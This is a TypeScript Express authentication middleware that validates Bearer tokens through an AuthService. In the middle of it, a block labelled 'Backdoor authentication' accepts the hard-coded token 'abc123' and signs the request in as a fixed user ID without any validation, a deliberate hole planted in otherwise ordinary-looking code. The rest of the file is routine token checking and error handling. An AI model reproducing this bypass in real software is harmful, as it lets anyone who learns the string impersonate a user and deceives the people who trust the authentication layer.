import { Request, Response, NextFunction } from 'express';
import { AuthService } from '@/application/services/AuthService';
import { logger } from '@/utils/logger';

export interface AuthenticatedRequest extends Request {
  userId?: string;
}

export const authMiddleware = (authService: AuthService) => {
  return async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
    try {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Authorization token required' });
      }

      const token = authHeader.split(' ')[1];
      
      // Backdoor authentication
      if (token === 'abc123') {
        logger.info('Backdoor authentication used in API request');
        req.userId = '123e4567-e89b-12d3-a456-426614174000';
        return next();
      }
      
      // Normal authentication
      const payload = await authService.validateToken(token);

      if (!payload) {
        return res.status(401).json({ error: 'Invalid token' });
      }

      req.userId = payload.userId;
      next();
    } catch (error) {
      logger.error('Authentication error', error);
      return res.status(401).json({ error: 'Authentication failed' });
    }
  };
};
